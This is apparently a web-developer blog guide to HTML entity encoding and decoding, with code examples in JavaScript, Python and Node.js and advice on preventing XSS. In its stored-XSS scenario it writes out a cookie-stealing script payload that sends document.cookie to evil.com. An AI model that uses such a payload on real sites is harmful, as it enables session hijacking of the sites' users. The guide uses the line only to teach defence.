---
title: "HTML Entity Encoder/Decoder: Complete Guide for Web Developers"
description: "Learn HTML entities, when to encode vs decode, and how to handle special characters safely in HTML. Includes a free online tool plus code examples in JavaScript and Python."
date: "2026-03-24"
tags: ["html", "encoding", "security", "web-development", "xss", "developer-tools"]
readingTime: "7 min read"
---

# HTML Entity Encoder/Decoder: Complete Guide for Web Developers

HTML entities are special codes that represent characters with special meaning in HTML — like `<`, `>`, `&`, and `"`. Encoding them correctly is essential for both correctness and security.

**[Try the DevPlaybook HTML Entity Encoder →](/tools/html-entity-encoder)**

## What Are HTML Entities?

HTML entities are string representations of characters that would otherwise be interpreted as HTML markup. They start with `&` and end with `;`.

```html
<!-- Without encoding — browser parses as HTML tag -->
<p>The formula is: a < b && b > c</p>  <!-- Broken! -->

<!-- With encoding — renders correctly -->
<p>The formula is: a &lt; b &amp;&amp; b &gt; c</p>
```

## Common HTML Entities Reference

| Character | Entity Name | Entity Number | Use Case |
|-----------|-------------|---------------|---------|
| `<` | `&lt;` | `&#60;` | Less-than sign, opening tag |
| `>` | `&gt;` | `&#62;` | Greater-than sign, closing tag |
| `&` | `&amp;` | `&#38;` | Ampersand |
| `"` | `&quot;` | `&#34;` | Double quote in attribute values |
| `'` | `&apos;` | `&#39;` | Single quote / apostrophe |
| ` ` | `&nbsp;` | `&#160;` | Non-breaking space |
| `©` | `&copy;` | `&#169;` | Copyright symbol |
| `®` | `&reg;` | `&#174;` | Registered trademark |
| `™` | `&trade;` | `&#8482;` | Trademark symbol |
| `€` | `&euro;` | `&#8364;` | Euro sign |
| `→` | `&rarr;` | `&#8594;` | Right arrow |
| `—` | `&mdash;` | `&#8212;` | Em dash |

## When to Encode HTML

**User-generated content:** Any text from users (comments, names, bios) must be HTML-encoded before inserting into the DOM. Failing to do this opens you up to XSS (Cross-Site Scripting) attacks.

**Dynamic content in templates:** When inserting dynamic values into HTML templates, always encode unless you explicitly want to allow HTML markup.

**Code examples in documentation:** Showing code samples with `<`, `>`, or `&` characters in HTML requires entity encoding.

**Emails (HTML):** HTML emails should encode special characters in content to avoid rendering issues across email clients.

## HTML Encoding in JavaScript

```javascript
// Encode HTML — safe for inserting untrusted content
function encodeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;  // Automatically encodes
  return div.innerHTML;
}

// Or manually:
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Usage
const userInput = '<script>alert("xss")</script>';
const safe = escapeHTML(userInput);
document.getElementById('output').innerHTML = safe;
// Displays literal text, doesn't execute script
```

### Decoding HTML Entities in JavaScript

```javascript
function decodeHTML(str) {
  const div = document.createElement('div');
  div.innerHTML = str;
  return div.textContent || div.innerText;
}

decodeHTML('&lt;b&gt;Bold&lt;/b&gt;');
// Returns: '<b>Bold</b>'
```

## HTML Encoding in Python

```python
import html

# Encode
text = '<script>alert("xss")</script>'
safe = html.escape(text)
print(safe)
# &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;

# Encode with quote=False (doesn't escape quotes — use in text nodes only)
html.escape(text, quote=False)

# Decode
encoded = '&lt;b&gt;Hello &amp; world&lt;/b&gt;'
decoded = html.unescape(encoded)
print(decoded)
# <b>Hello & world</b>
```

## HTML Encoding in Node.js

```javascript
// Using the 'he' library (highly recommended)
// npm install he

const he = require('he');

// Encode
he.encode('<p>Hello & "world"</p>');
// '&lt;p&gt;Hello &amp; &quot;world&quot;&lt;/p&gt;'

// Decode
he.decode('&lt;p&gt;Hello&lt;/p&gt;');
// '<p>Hello</p>'

// The 'he' library handles all named + numeric entities correctly
```

## Security: HTML Encoding and XSS Prevention

HTML encoding is your first line of defense against Cross-Site Scripting (XSS) attacks.

**Stored XSS scenario:**
```
1. Attacker submits: <script>fetch('https://evil.com?cookie='+document.cookie)</script>
2. App stores raw text in database
3. App renders without encoding: innerHTML = rawValue
4. Every user who views the page runs the attacker's script
```

**Prevention:**
```javascript
// UNSAFE — direct innerHTML with user content
element.innerHTML = userComment;  // ❌ XSS vulnerability

// SAFE — textContent or encoded innerHTML
element.textContent = userComment;  // ✅ Auto-encodes
element.innerHTML = escapeHTML(userComment);  // ✅ Manually encoded
```

**React's automatic escaping:**
React JSX escapes all values by default, so `<p>{userInput}</p>` is safe. The `dangerouslySetInnerHTML` prop bypasses this — use it only with sanitized content.

## Numeric vs Named Entities

HTML supports two entity formats:

```html
<!-- Named entity (more readable) -->
&copy; &lt; &amp;

<!-- Numeric decimal entity -->
&#169; &#60; &#38;

<!-- Numeric hexadecimal entity -->
&#xA9; &#x3C; &#x26;
```

All three represent the same characters. Named entities are preferred for readability. Numeric entities work for any Unicode character.

## When to Use `&nbsp;`

`&nbsp;` (non-breaking space) prevents a line break between two words. Use it sparingly:

```html
<!-- Keep "10 AM" from breaking across lines -->
Meeting at 10&nbsp;AM

<!-- Keep a number and its unit together -->
Distance: 42&nbsp;km

<!-- Avoid using for layout spacing — use CSS padding/margin instead -->
```

## Tools for HTML Entity Encoding

**Browser-based:** [DevPlaybook HTML Entity Encoder](/tools/html-entity-encoder) — paste text and get encoded output instantly.

**CLI:**
```bash
# Python one-liner
python3 -c "import html, sys; print(html.escape(sys.stdin.read()))"

# Pipe file content
cat input.txt | python3 -c "import html, sys; print(html.escape(sys.stdin.read()))"
```

**npm package:**
```bash
npm install -g he
echo '<b>Hello</b>' | he --encode
```

## Conclusion

HTML entity encoding is fundamental to web security and correctness. Always encode user-generated content before inserting it into HTML. Use a JSON-aware approach when encoding is needed programmatically, and rely on framework-level escaping (React, Vue, Angular) whenever possible.

**[Encode HTML Entities Online →](/tools/html-entity-encoder)**
